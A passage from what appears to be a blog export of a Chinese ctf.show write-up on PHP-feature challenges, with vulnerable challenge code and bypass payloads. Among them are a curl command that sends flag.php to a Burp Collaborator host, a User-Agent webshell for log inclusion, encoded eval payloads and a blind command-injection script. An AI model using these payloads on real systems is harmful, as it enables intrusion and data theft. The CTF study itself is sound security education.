CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[2])\n```\n\n```\n<?php\n$a=$_SERVER['argv'];\nvar_dump($a);\n\n传入 a=1+fl0g=flag_give_me\n结果如下\narray(2) { [0]=> string(3) \"a=1\" [1]=> string(17) \"fl0g=flag_give_me\" }\n\n```\n\n\n\n### web127\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n\n\n//特殊字符检测\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nif(waf($url)){\n    die(\"嗯哼？\");\n}else{\n    extract($_GET);\n}\n\n\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n```\n\n> `$_SERVER['QUERY_STRING'];`获取的查询语句是服务端还没url解码的，所以url编码绕过即可：\n\n写个脚本跑一下\n\n```\n<?php\nfunction waf($num){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $num)){\n        return false;\n    }else{\n        return true;\n    }\n}\nfor($i = 0; $i<129; $i++){\n\t$num=chr($i);\n\tif(waf($num)){\n\t\techo \"未编码：\".$num.\"   经过编码：\".urlencode(chr($i)).\"\\n\";\n\t}\n}\n?>\n```\n\n空格可以绕过，%20\n\n**payload**\n\n```\n?ctf show=ilove36d\n```\n\n\n\n### web128\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"嗯哼？\";\n}\n\n\n\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n}\n```\n\n这题我傻了。。，还是看大师傅的wp吧\n\n考察点是gettext拓展使用\n\n在开启该拓展后 _() 等效于 gettext()\n\n```\n<?php\necho gettext(\"phpinfo\");\n结果  phpinfo\n\necho _(\"phpinfo\");\n结果 phpinfo\n```\n\n所以 `call_user_func('_','phpinfo')` 返回的就是phpinfo\n\n因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars\n\n```\nget_defined_vars ( void ) : array\n此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。\n```\n\n**payload**\n\n```\n?f1=_&f2=get_defined_vars\n```\n\n\n\n### web129\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')>0){\n        echo readfile($f);\n    }\n}\n```\n\n路径穿越很简单\n\n`../`   回到上一级目录\n\n`./`    表示当前目录\n\n**payload**\n\n```\n?f=../../ctfshow../../../var/www/html/flag.php\n```\n\n\n\n### web130\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\n> preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0\n>\n> if(0 === flase)返回值为false0不是强等于false的\n>\n> stripos()函数对数组不识别，遇到数组会返回null，null!==flase\n\n在/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了\n\n**payload**\n\n```\n?f=ctfshow[]\n?f[]=1\n?f=ctfshow  (第一个正则匹配时，必须要在ctfshow前面有字符)\n```\n\n下面就要介绍p神的PCRE回溯\n\n> https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\n\n\n\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。我们可以通过`var_dump(ini_get('pcre.backtrack_limit'));`的方式查看当前环境下的上限：\n\n我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。\n\n脚本\n\n```\nimport requests\nurl=\"http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/\"\ndata={\n    'f':'very'*250000+'ctfshow'\n}\nr=requests.post(url,data=data)\nprint(r.text)\n\n```\n\n\n\n### web131\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\n老老实实用PCRE回溯吧\n\n\n\n### web132\n\n扫出/admin\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n\nif(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n} \n```\n\n这题的突破点在于\n\n```\nif($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\")\n```\n\n```\n<?php\nif(false && false || true){\n\techo \"true!\";\n}else{\n    echo \"false!\";\n}\n?>\n\n//返回结果为true\n```\n\n**payload**\n\n```\n?code=admin&password=admin&username=admin\n```\n\n\n\n### web133\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"6个字母都还不够呀?!\");\n    }\n}\n```\n\n```\nget传参   F=`$F `;sleep 3\n经过substr($F,0,6)截取后 得到  `$F `;\n也就是会执行 eval(\"`$F `;\");\n我们把原来的$F带进去\neval(\"``$F `;sleep 3`\");\n也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(\"`$F `;sleep 3\");\n前面的命令我们不需要管，但是后面的命令我们可以自由控制。\n这样就在服务器上成功执行了 sleep 3\n所以 最后就是一道无回显的RCE题目了\n```\n\n无回显我们可以用反弹shell 或者curl外带 或者盲注\n 这里的话反弹没有成功，但是可以外带。\n\n```\ncurl  http://xxx:4567?p=`tac f*`\n```\n\n当然要是没有公网ip的话，bp也可以帮到我们这个忙\n\n**payload**\n\n```\n/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;\n```\n\n\n\n### web134\n\n```\n$key1 = 0;\n$key2 = 0;\nif(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {\n    die(\"nonononono\");\n}\n@parse_str($_SERVER['QUERY_STRING']);\nextract($_POST);\nif($key1 == '36d' && $key2 == '36d') {\n    die(file_get_contents('flag.php'));\n}\n```\n\n用`extract`进行变量覆盖\n\n测试一下\n\n```\nparse_str($_SERVER['QUERY_STRING']);\nvar_dump($_POST);\n//然后我们传入 _POST[‘a’]=123\n会发现输出的结果为array(1) { [\"‘a’\"]=> string(3) “123” }\n也就是说现在的$_POST[‘a’]存在并且值为123\n```\n\n**payload**\n\n```\n?_POST[key1]=36d&_POST[key2]=36d\n```\n\n\n\n### web135\n\n```\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"师傅们居然破解了前面的，那就来一个加强版吧\");\n    }\n}\n```\n\n**payload**\n\n```\n?F=`$F` ;cp flag.php 2.txt;\n?F=`$F` ;uniq flag.php>4.txt;\n```\n\n\n\n### web136\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\n虽然过滤了很多，但是在linux中我们可以用tee写文件\n\n**payload**\n\n```\nls|tee 1.txt\nls / |tee 1.txt\ncat /f* |1.txt\n```\n\n\n\n### web137\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\n\n\ncall_user_func($_POST['ctfshow']); \n```\n\n很简单，直接调用ctfshow类里的getFlag方法\n\n```\nPOST:ctfshow=ctfshow::getFlag\n```\n\n借用yu22x师傅的拓展\n\n> php中 ->与:: 调用类中的成员的区别\n> ->用于动态语境处理某个类的某个实例\n> ::可以调用一个静态的、不依赖于其他初始化的类方法.\n>\n> **也就是说双冒号可以不用实例化类就可以直接调用类中的方法**\n\n\n\n### web138\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\nif(strripos($_POST['ctfshow'], \":\")>-1){\n    die(\"private function\");\n}\n\ncall_user_func($_POST['ctfshow']);\n```\n\n相比于上一题，这个题过滤了冒号\n\ncall_user_func中不但可以传字符串也可以传数组\n\n本地测试\n\n```\ncall_user_func(array($classname, 'say_hello'));\n这时候会调用 classname中的 say_hello方法\n```\n\n**payload**\n\n```\nctfshow[0]=ctfshow&ctfshow[1]=getFlag\n```\n\n\n\n### web139\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\n只能盲打咯\n\n脚本\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"\nresult=\"\"\nkey=0\nfor j in range(1,45):\n    print(j)\n    if key==1:\n        break\n    for n in str:\n        payload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n        #print(payload)\n        url=\"http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=\"+payload\n        try:\n            requests.get(url,timeout=(2.5,2.5))\n        except:\n            result=result+n\n            print(result)\n            break\n\n```\n\n\n\n### web140\n\n```\nhighlight_file(__FILE__);\nif(isset($_POST['f1']) && isset($_POST['f2'])){\n    $f1 = (String)$_POST['f1'];\n    $f2 = (String)$_POST['f2'];\n    if(preg_match('/^[a-z0-9]+$/', $f1)){\n        if(preg_match('/^[a-z0-9]+$/', $f2)){\n            $code = eval(\"return $f1($f2());\");\n            if(intval($code) == 'ctfshow'){\n                echo file_get_contents(\"flag.php\");\n            }\n        }\n    }\n}\n\n```\n\n```\nif(intval($code) == 'ctfshow')\n```\n\n这里进行的是弱比较,可以用null绕过\n\n```\n$code = eval(\"return $f1($f2());\"); \n```\n\n```\nintval('a')==0 intval('.')==0 intval('/')==0\n```\n\npayload\n\n```\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1\n```\n\n实际上乱弄一些函数都可以，最后得到的结果是null同样符合条件\n\n\n\n### web141\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/^\\W+$/', $v3)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n`/^\\W+$/` 作用是匹配非数字字母下划线的字符,\n\n看看下面这句话\n\n```\neval(\"return 1;phpinfo();\");\n```\n\n显然这里的`phpinfo()`是不执行的，但数字是可以和命令进行一些运算的，例如 `1-phpinfo();`是可以执行phpinfo()命令的。\n\n```\neval(\"return 1-phpinfo();\");//可以执行\n```\n\n**payload**\n\n```\nv1=1&v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&v2=1\n```\n\n\n\n### web142\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['v1'])){\n    $v1 = (String)$_GET['v1'];\n    if(is_numeric($v1)){\n        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);\n        sleep($d);\n        echo file_get_contents(\"flag.php\");\n    }\n} \n```\n\n这里我们令`v1=0`就可以让`$d=0`\n\n\n\n### web143\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n过滤了加减，我们可以用乘除，过滤了取反我们可以用异或\n\n**payload**\n\n```\nv1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n```\n\n\n\n### web144\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && check($v3)){\n        if(preg_match('/^\\W+$/', $v2)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n\nfunction check($str){\n    return strlen($str)===1?true:false;\n}\n```\n\n与前面几个题类似，将v1,v2,v3三个顺序重新调一下就好了\n\n**payload**\n\n```\n?v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)\n```\n\n\n\n### web155\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n看了yu22x师傅的wp，妙！\n\n```\neval(\"return 1?phpinfo():1;\");\n```\n\n这里考察了三目运算符，这里是可以执行phpinfo()的\n\n```\n?v1=1&v3=?(~%8F%97%8F%96%91%99%90)():&v2=1\n```\n\n这样可以执行phpinfo()\n\npayload\n\n```\n?v1=1&v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&v2=1\n```\n\n\n\n### web146\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n过滤了冒号，无法使用三目运算符，但是可以使用等号和位运算符\n\n```\neval(\"return 1==phpinfo()||1;\");\n```\n\n这里可以执行phpinfo()\n\n**payload**\n\n```\n?v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&v2=1\n\n?v1=1&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%14%01%03%20%06%02'|'%60%60%60%20%60%28')|&v2=1\n\n?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1\n```\n\n\n\n### web147\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_POST['ctf'])){\n    $ctfshow = $_POST['ctf'];\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\n        $ctfshow('',$_GET['show']);\n    }\n\n}\n```\n\n不会，还是老老实实看wp吧。\n\n考察点：create_function()代码注入\n\n```\ncreate_function('$a','echo $a.\"123\"')\n\n类似于\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n\n```\n\n那么如果我们第二个参数传入 echo 1;}phpinfo();//\n 就等价于\n\n```\nfunction f($a) {\n  echo 1;}phpinfo();//\n}\n从而执行phpinfo()命令\nfuzz后发现%5c可以绕过这个正则表达式\n```\n\n**payload**\n\n```\nget: ?show=echo 123;}system('tac f*');//\npost: ctf=%5ccreate_function\n```\n\n\n\n### web148\n\n```\ninclude 'flag.php';\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n    if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&\\*\\+\\- ]+/\",$code)){\n        die(\"error\");\n    }\n    @eval($code);\n}\nelse{\n    highlight_file(__FILE__);\n}\n\nfunction get_ctfshow_fl0g(){\n    echo file_get_contents(\"flag.php\");\n}\n```\n\n未过滤异或，直接构造\n\n**payload**\n\n```\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%02\"^\"%7d%60%60%21%60%28\");\n```\n\n\n\n### web149\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n\nfile_put_contents($_GET['ctf'], $_POST['show']);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n```\n\n非预期\n\n往index.php直接写马，然后蚁剑连接即可\n\n预期解\n\n文件竞争，一个负责一直写文件，一个负责一直读文件\n\n\n\n### web150\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n}\n\n```\n\n日志绕过\n\n```\nPOST /?isVIP=1 HTTP/1.1\nHost: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show\nUser-Agent: <?php eval($_POST[1]);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.1418869291.1680592508\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\n\nctf=/var/log/nginx/access.log&1=system('cat f*');\n```\n\n\n\n### web150_plus\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE && strrpos($ctf,\"log\")===FALSE){\n    include($ctf);\n}\n```\n\n过滤了log，不能日志包含绕过了\n\n> ```\n> 这个题一点点小坑__autoload()函数不是类里面的\n> __autoload — 尝试加载未定义的类\n> 最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦\n> 原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用\n> __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo\n> 接下来就去getshell啦\n> ```\n\n**payload**\n\n```\n/?..CTFSHOW..=phpinfo\n```\n\nphp变量不能含有点空格，遇到这些会自动转化为下划线\n\n\n\n\n\n------\n\n总算是写完啦，不过这永远不是终点...","slug":"PHP特性","published":1,"updated":"2024-04-17T08:43:00.731Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7io000bh7762hqn3z20","content":"<h1 id=\"PHP特性\"><a href=\"#PHP特性\" class=\"headerlink\" title=\"PHP特性\"></a>PHP特性</h1><p>php特性这个东西很杂，覆盖的内容也很多，都是一些零碎的知识点，这次正好借这个刷题的机会，做一个小复习</p>\n<h3 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里<code>preg_match(&quot;/[0-9]/&quot;, $num</code>过滤了数字，但是</p>\n<p>我们要让<code>intval($num)</code>为真，这题考的就是<code>intval</code>的特性</p>\n<p><strong>intval()的测试</strong></p>\n<blockquote>\n<p>返回值<br>成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array<br>返回 1。 </p>\n</blockquote>\n<p>测试了一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">echo intval(1234);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(042);  //34  0开头的，当成了8进制</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(0x1a);  //26 0x开头，当成16进制</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(3e3);  //3000 科学计数法 3 X 10的三次方</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&#x27;3e3&#x27;);  //3000</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&quot;1234a&quot;);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(4.2); //转化为整数</span><br></pre></td></tr></table></figure>\n\n<p>回到题目</p>\n<p>可以用数组绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num[]=a</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>与上题类似，但这次没过滤数字</p>\n<p>这里又要说一下<code>intval</code>的相关特性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>如果 <code>base</code> 是 0，通过检测 <code>var</code> 的格式来决定使用的进制：</p>\n<ul>\n<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>\n<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>\n<li>将使用 10 进制 (decimal)。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;4476a&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;010574&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;0x117c&#x27;,0)=4476</span><br></pre></td></tr></table></figure>\n\n<p>上述三中均能绕过</p>\n<h3 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span 